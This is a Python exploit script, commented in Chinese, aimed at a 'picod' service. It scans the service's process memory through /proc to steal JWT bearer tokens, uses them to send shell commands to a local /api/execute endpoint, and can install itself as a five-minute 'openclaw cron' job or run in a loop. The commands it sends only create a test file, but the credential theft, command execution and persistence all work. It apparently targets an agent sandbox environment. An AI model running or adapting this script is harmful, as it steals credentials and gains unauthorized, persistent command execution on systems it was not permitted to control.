#!/usr/bin/env python3
"""
Picod JWT Token 完整利用脚本
一次性完成：进程发现 -> 内存提取 -> API利用 -> 日志记录 -> 计划任务

使用方法:
    python3 picod_exploit_all_in_one.py           # 单次执行
    python3 picod_exploit_all_in_one.py --install # 安装为计划任务
    python3 picod_exploit_all_in_one.py --loop    # 持续监控模式
"""

import os
import re
import sys
import json
import base64
import time
import subprocess
import argparse
import requests
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ==================== 配置 ====================
WORKSPACE = os.path.expanduser("~/.openclaw/workspace")
LOG_FILE = os.path.join(WORKSPACE, "picod_exploit.log")
CRON_NAME = "picod-jwt-exploit"
CRON_INTERVAL = "*/5 * * * *"  # 每5分钟

# API 配置
API_HOST = "127.0.0.1"
API_PORT = 8080
API_ENDPOINT = "/api/execute"

# 执行的命令
COMMANDS = ["touch /tmp/picodtest", "ls /tmp/picodtest"]

# JWT 正则
JWT_PATTERN = re.compile(
    rb'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
    re.MULTILINE
)


# ==================== 日志 ====================
def log(message, level="INFO", print_console=True):
    """写入日志文件并输出到控制台"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f"[{timestamp}] [{level}] {message}"
    
    if print_console:
        print(log_line)
    
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, "a") as f:
            f.write(log_line + "\n")
    except Exception as e:
        print(f"写入日志失败: {e}")


# ==================== 步骤1: 获取 picod 进程ID ====================
def get_picod_pid():
    """获取 picod 进程的 PID"""
    log("=" * 60)
    log("步骤1: 查找 picod 进程")
    log("=" * 60)
    
    try:
        result = subprocess.run(
            ["pgrep", "-f", "picod"],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0 and result.stdout.strip():
            pids = result.stdout.strip().split('\n')
            pid = int(pids[0])
            log(f"✅ 找到 picod 进程: PID={pid}")
            return pid
    except Exception as e:
        log(f"pgrep 失败: {e}", "WARNING")
    
    # 备用方法：通过 ps 命令查找
    try:
        result = subprocess.run(
            ["ps", "aux"],
            capture_output=True,
            text=True
        )
        
        for line in result.stdout.split('\n'):
            if 'picod' in line and 'grep' not in line:
                parts = line.split()
                if len(parts) >= 2:
                    pid = int(parts[1])
                    log(f"✅ 找到 picod 进程: PID={pid}")
                    return pid
    except Exception as e:
        log(f"ps 查找失败: {e}", "ERROR")
    
    log("❌ 未找到 picod 进程", "ERROR")
    return None


# ==================== 步骤2: 从内存提取 JWT token ====================
def base64url_decode(data):
    """Base64URL 解码"""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    data = data.replace('-', '+').replace('_', '/')
    try:
        return base64.b64decode(data)
    except Exception:
        return None


def decode_jwt(token):
    """解码 JWT token"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None, None
        
        header = base64url_decode(parts[0])
        payload = base64url_decode(parts[1])
        
        if header and payload:
            return json.loads(header.decode()), json.loads(payload.decode())
    except Exception:
        pass
    return None, None


def is_token_expired(token):
    """检查 token 是否过期"""
    _, payload = decode_jwt(token)
    if payload and 'exp' in payload:
        exp_time = payload['exp']
        current_time = int(time.time())
        return current_time > exp_time, exp_time
    return None, None


def extract_jwt_from_memory(pid):
    """从进程内存中提取 JWT token"""
    log("=" * 60)
    log(f"步骤2: 从进程 {pid} 内存中提取 JWT token")
    log("=" * 60)
    
    tokens = []
    
    maps_path = f'/proc/{pid}/maps'
    mem_path = f'/proc/{pid}/mem'
    
    if not os.path.exists(maps_path):
        log(f"❌ 进程 {pid} 不存在或无权限访问", "ERROR")
        return tokens
    
    if not os.path.exists(mem_path):
        log(f"❌ 无法访问进程 {pid} 的内存", "ERROR")
        return tokens
    
    try:
        with open(maps_path, 'r') as f:
            maps = f.readlines()
    except PermissionError:
        log(f"❌ 无权限读取 {maps_path}", "ERROR")
        return tokens
    
    scanned_regions = 0
    total_size = 0
    
    for line in maps:
        parts = line.split()
        if len(parts) < 2:
            continue
        
        perms = parts[1]
        if 'r' not in perms:
            continue
        
        addr_range = parts[0].split('-')
        start = int(addr_range[0], 16)
        end = int(addr_range[1], 16)
        size = end - start
        
        # 限制扫描大小
        if size > 100 * 1024 * 1024:
            continue
        
        try:
            with open(mem_path, 'rb') as mem:
                mem.seek(start)
                data = mem.read(size)
                
                matches = JWT_PATTERN.findall(data)
                for match in matches:
                    token = match.decode('utf-8', errors='ignore')
                    if token not in tokens:
                        tokens.append(token)
                
                scanned_regions += 1
                total_size += size
        except (PermissionError, OSError):
            pass
        except Exception:
            pass
    
    log(f"扫描完成: {scanned_regions} 个内存区域, {total_size / 1024 / 1024:.1f} MB")
    
    if tokens:
        log(f"✅ 找到 {len(tokens)} 个 JWT token")
    else:
        log("❌ 未找到 JWT token")
    
    return tokens


# ==================== 步骤3: 利用 JWT token 请求 API ====================
def exploit_api(token, command):
    """使用 token 请求 API"""
    url = f"http://{API_HOST}:{API_PORT}{API_ENDPOINT}"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    data = {"command": command}
    
    try:
        response = requests.post(url, headers=headers, json=data, timeout=10)
        return response.status_code, response.text
    except requests.exceptions.RequestException as e:
        return None, str(e)


def process_token(token):
    """处理单个 token 并尝试利用"""
    log("-" * 60)
    log(f"处理 Token: {token[:60]}...")
    
    # 解码 token
    header, payload = decode_jwt(token)
    if header:
        log(f"  算法: {header.get('alg', 'unknown')}")
    if payload:
        log(f"  签发者: {payload.get('iss', 'unknown')}")
        if 'exp' in payload:
            exp_time = payload['exp']
            current_time = int(time.time())
            if current_time > exp_time:
                log(f"  状态: ❌ 已过期")
            else:
                remaining = exp_time - current_time
                log(f"  状态: ✅ 有效 (剩余 {remaining} 秒)")
    
    # 执行命令
    success_count = 0
    for cmd in COMMANDS:
        log(f"  执行命令: {cmd}")
        status_code, response = exploit_api(token, cmd)
        
        if status_code:
            log(f"  HTTP {status_code}: {response[:200]}")
            
            if status_code == 200:
                log(f"  ✅ 命令执行成功!")
                try:
                    result = json.loads(response)
                    if 'output' in result:
                        log(f"  输出: {result['output']}")
                    elif 'result' in result:
                        log(f"  结果: {result['result']}")
                except:
                    pass
                success_count += 1
            elif status_code == 401:
                log(f"  ❌ 认证失败: Token 无效或已过期")
            else:
                log(f"  ⚠️ 其他状态码: {status_code}")
        else:
            log(f"  ❌ 请求失败: {response}", "ERROR")
    
    return success_count > 0


# ==================== 步骤4: 主执行流程 ====================
def run_exploit():
    """执行完整的利用流程"""
    log("\n" + "=" * 60)
    log("Picod JWT Token 完整利用脚本")
    log("=" * 60)
    log(f"日志文件: {LOG_FILE}")
    log(f"目标地址: {API_HOST}:{API_PORT}")
    log(f"执行命令: {COMMANDS}")
    log("=" * 60)
    
    # 步骤1: 获取 picod 进程ID
    pid = get_picod_pid()
    if not pid:
        log("利用失败: 无法找到 picod 进程", "ERROR")
        return False
    
    # 步骤2: 从内存提取 JWT token
    tokens = extract_jwt_from_memory(pid)
    if not tokens:
        log("利用失败: 未找到 JWT token", "ERROR")
        return False
    
    # 步骤3: 利用 token 请求 API
    log("=" * 60)
    log("步骤3: 利用 JWT token 请求 API")
    log("=" * 60)
    
    success = False
    for token in tokens:
        if process_token(token):
            success = True
            break  # 成功一个就退出
    
    # 步骤4: 记录结果
    log("=" * 60)
    log("步骤4: 执行结果")
    log("=" * 60)
    
    if success:
        log("✅ 利用成功! 已执行所有命令", "SUCCESS")
    else:
        log("❌ 利用失败: 所有 token 都无法使用", "WARNING")
    
    log("=" * 60)
    return success


# ==================== 步骤5: 安装计划任务 ====================
def install_cron():
    """安装为计划任务"""
    log("=" * 60)
    log("步骤5: 安装计划任务")
    log("=" * 60)
    
    script_path = os.path.abspath(__file__)
    
    # 构建 openclaw cron 命令
    cmd = [
        "openclaw", "cron", "add",
        CRON_INTERVAL,
        "--name", CRON_NAME,
        "--command", f"python3 {script_path}",
        "--channel", "xiaoyi-channel"
    ]
    
    log(f"执行命令: {' '.join(cmd)}")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            log(f"✅ 计划任务安装成功")
            log(f"输出: {result.stdout}")
        else:
            log(f"❌ 计划任务安装失败", "ERROR")
            log(f"错误: {result.stderr}")
            return False
    except Exception as e:
        log(f"❌ 执行失败: {e}", "ERROR")
        return False
    
    # 验证安装
    try:
        result = subprocess.run(
            ["openclaw", "cron", "list"],
            capture_output=True,
            text=True
        )
        log(f"当前计划任务:\n{result.stdout}")
    except Exception:
        pass
    
    return True


# ==================== 持续监控模式 ====================
def run_loop(interval=300):
    """持续监控模式"""
    log(f"持续监控模式启动，间隔 {interval} 秒")
    
    iteration = 0
    while True:
        iteration += 1
        log(f"\n{'='*60}")
        log(f"第 {iteration} 次执行")
        log("=" * 60)
        
        run_exploit()
        
        log(f"\n等待 {interval} 秒后进行下一次执行...")
        time.sleep(interval)


# ==================== 主函数 ====================
def main():
    parser = argparse.ArgumentParser(
        description="Picod JWT Token 完整利用脚本",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
    python3 picod_exploit_all_in_one.py           # 单次执行
    python3 picod_exploit_all_in_one.py --install # 安装为计划任务
    python3 picod_exploit_all_in_one.py --loop    # 持续监控模式
    python3 picod_exploit_all_in_one.py --loop --interval 60  # 自定义间隔
        """
    )
    parser.add_argument("--install", action="store_true", help="安装为计划任务")
    parser.add_argument("--loop", action="store_true", help="持续监控模式")
    parser.add_argument("--interval", type=int, default=300, help="监控间隔(秒)")
    parser.add_argument("--quiet", action="store_true", help="静默模式(仅写日志)")
    
    args = parser.parse_args()
    
    if args.quiet:
        global print_console
        # 临时禁用控制台输出
        import builtins
        original_print = builtins.print
        builtins.print = lambda *args, **kwargs: None
    
    try:
        if args.install:
            install_cron()
        elif args.loop:
            run_loop(args.interval)
        else:
            run_exploit()
    finally:
        if args.quiet:
            builtins.print = original_print


if __name__ == '__main__':
    main()
